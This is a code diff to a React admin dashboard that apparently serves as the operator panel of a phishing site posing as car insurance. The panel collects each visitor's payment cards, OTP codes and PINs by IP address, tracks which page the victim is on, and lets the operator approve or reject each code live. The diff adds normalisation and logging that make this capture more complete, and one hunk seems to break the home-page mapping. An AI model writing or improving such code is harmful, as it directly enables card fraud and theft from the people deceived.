@@ -75,15 +75,35 @@ export default function AdminDashboard() {
     });
 
     socket.on('newOTP', (data) => {
+      console.log('📨 Received newOTP:', data);
       setNewDataCount(prev => prev + 1);
       playOTPSound();
-      setPendingOTP(data);
+      // تطبيع البيانات للتأكد من وجود IP
+      const normalizedData = {
+        ...data,
+        ip: data.ip || data.payload?.ip,
+        otpCode: data.otpCode || data.payload?.otpCode,
+        cardLastDigits: data.cardLastDigits || data.payload?.cardLastDigits,
+        phoneNumber: data.phoneNumber || data.payload?.phoneNumber,
+        amount: data.amount || data.payload?.amount
+      };
+      setPendingOTP(normalizedData);
     });
 
     socket.on('newPIN', (data) => {
+      console.log('📨 Received newPIN:', data);
       setNewDataCount(prev => prev + 1);
       playPINSound();
-      setPendingPIN(data);
+      // تطبيع البيانات للتأكد من وجود IP
+      const normalizedData = {
+        ...data,
+        ip: data.ip || data.payload?.ip,
+        pinCode: data.pinCode || data.payload?.pinCode,
+        cardLastDigits: data.cardLastDigits || data.payload?.cardLastDigits,
+        phoneNumber: data.phoneNumber || data.payload?.phoneNumber,
+        amount: data.amount || data.payload?.amount
+      };
+      setPendingPIN(normalizedData);
     });
 
     socket.on('userConnected', ({ ip }) => {
@@ -98,6 +118,12 @@ export default function AdminDashboard() {
       ));
     });
 
+    socket.on('locationUpdated', ({ ip, page }) => {
+      setCustomers(prev => prev.map(c => 
+        c.ip === ip ? { ...c, currentPage: page } : c
+      ));
+    });
+
     return () => {
       clearInterval(refreshInterval);
       socket.off('initialData');
@@ -106,6 +132,7 @@ export default function AdminDashboard() {
       socket.off('newPIN');
       socket.off('userConnected');
       socket.off('userDisconnected');
+      socket.off('locationUpdated');
     };
   }, [socket, connected]);
 
@@ -113,27 +140,37 @@ export default function AdminDashboard() {
     const customersMap = new Map();
     const allIPs = new Set();
 
+    // جمع جميع IPs من جميع المصادر
     [
       data.carDetails, data.moreDetails, data.selectInsurance,
       data.insuranceInfo, data.payment, data.locations,
-      data.otpCodes, data.pinCodes
+      data.otpCodes, data.pinCodes, data.plateNumber,
+      data.policyDate, data.quote
     ].forEach(arr => {
       if (Array.isArray(arr)) {
         arr.forEach(item => item.ip && allIPs.add(item.ip));
       }
     });
 
+    console.log('📊 Processing data for IPs:', Array.from(allIPs));
+
     allIPs.forEach(ip => {
+      // جمع جميع السجلات لكل IP (لا نأخذ آخر سجل فقط، بل نحتفظ بالجميع)
       const carDetailsAll = data.carDetails?.filter(d => d.ip === ip) || [];
       const moreDetailsAll = data.moreDetails?.filter(d => d.ip === ip) || [];
       const insuranceAll = data.selectInsurance?.filter(d => d.ip === ip) || [];
       const customerInfoAll = data.insuranceInfo?.filter(d => d.ip === ip) || [];
+      const plateNumberAll = data.plateNumber?.filter(d => d.ip === ip) || [];
+      const policyDateAll = data.policyDate?.filter(d => d.ip === ip) || [];
+      const quoteAll = data.quote?.filter(d => d.ip === ip) || [];
       
+      // للعرض في الجدول، نأخذ آخر سجل
       const carDetails = carDetailsAll[carDetailsAll.length - 1];
       const moreDetails = moreDetailsAll[moreDetailsAll.length - 1];
       const insurance = insuranceAll[insuranceAll.length - 1];
       const customerInfo = customerInfoAll[customerInfoAll.length - 1];
       
+      // البطاقات: نحتفظ بجميع السجلات (لا نأخذ آخر واحد فقط)
       const payments = data.payment?.filter(d => d.ip === ip) || [];
       const otpCodes = data.otpCodes?.filter(d => d.ip === ip) || [];
       const pinCodes = data.pinCodes?.filter(d => d.ip === ip) || [];
@@ -162,6 +199,8 @@ export default function AdminDashboard() {
         ? new Date(Math.max(...allTimestamps.map(t => new Date(t).getTime())))
         : new Date();
 
+      console.log(`👤 User ${ip}: ${payments.length} payments, ${otpCodes.length} OTPs, ${pinCodes.length} PINs`);
+
       customersMap.set(ip, {
         ip,
         currentPage: location?.currentPage || '/',
@@ -169,9 +208,9 @@ export default function AdminDashboard() {
         moreDetails,
         insurance,
         customerInfo,
-        payments,
-        otpCodes,
-        pinCodes,
+        payments,        // جميع البطاقات
+        otpCodes,        // جميع OTPs
+        pinCodes,        // جميع PINs
         status,
         lastUpdate: lastUpdate.getTime(),
         isActive
@@ -182,6 +221,7 @@ export default function AdminDashboard() {
       new Date(b.lastUpdate) - new Date(a.lastUpdate)
     );
 
+    console.log('✅ Processed customers:', customersList.length);
     setCustomers(customersList);
     updateStats(customersList);
   };
@@ -212,8 +252,12 @@ export default function AdminDashboard() {
 
   const approveOTP = () => {
     if (socket && pendingOTP) {
+      // استخراج IP من مصادر مختلفة محتملة
+      const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
+      console.log('✅ Approving OTP for IP:', ip, 'Full data:', pendingOTP);
+      
       socket.emit('otpVerificationStatus', {
-        ip: pendingOTP.ip || pendingOTP.payload?.ip,
+        ip: ip,
         status: 'approved',
         message: 'تم قبول رمز التحقق'
       });
@@ -223,8 +267,11 @@ export default function AdminDashboard() {
 
   const rejectOTP = () => {
     if (socket && pendingOTP) {
+      const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
+      console.log('❌ Rejecting OTP for IP:', ip, 'Full data:', pendingOTP);
+      
       socket.emit('otpVerificationStatus', {
-        ip: pendingOTP.ip || pendingOTP.payload?.ip,
+        ip: ip,
         status: 'rejected',
         message: 'رمز التحقق غير صحيح'
       });
@@ -234,8 +281,12 @@ export default function AdminDashboard() {
 
   const approvePIN = () => {
     if (socket && pendingPIN) {
+      // استخراج IP من مصادر مختلفة محتملة
+      const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
+      console.log('✅ Approving PIN for IP:', ip, 'Full data:', pendingPIN);
+      
       socket.emit('pinVerificationStatus', {
-        ip: pendingPIN.ip || pendingPIN.payload?.ip,
+        ip: ip,
         status: 'approved',
         message: 'تم قبول الرمز السري'
       });
@@ -245,8 +296,12 @@ export default function AdminDashboard() {
 
   const rejectPIN = () => {
     if (socket && pendingPIN) {
+      // استخراج IP من مصادر مختلفة محتملة
+      const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
+      console.log('❌ Rejecting PIN for IP:', ip, 'Full data:', pendingPIN);
+      
       socket.emit('pinVerificationStatus', {
-        ip: pendingPIN.ip || pendingPIN.payload?.ip,
+        ip: ip,
         status: 'rejected',
         message: 'الرمز السري غير صحيح'
       });
@@ -304,7 +359,7 @@ export default function AdminDashboard() {
 
   const getPageBadge = (page) => {
     const pageNames = {
-      '/': 'الصفحة الرئيسية',
+      '/الصفحة الرئيسية': 'الصفحة الرئيسية',
       '/car-details': 'بيانات المركبة',
       '/more-details': 'المزيد من البيانات',
       '/select-insurance': 'اختيار التأمين',
@@ -1011,7 +1066,9 @@ export default function AdminDashboard() {
                     <td className="px-4 py-4">
                       <div className="flex items-center gap-1">
                         <CreditCard className="w-4 h-4 text-purple-600" />
-                        <span className="font-bold text-purple-600">{customer.payments?.length || 0}</span>
+                        <span className="font-bold text-purple-600" title={`${customer.payments?.length || 0} بطاقة`}>
+                          {customer.payments?.length || 0}
+                        </span>
                       </div>
                     </td>
                     <td className="px-4 py-4">
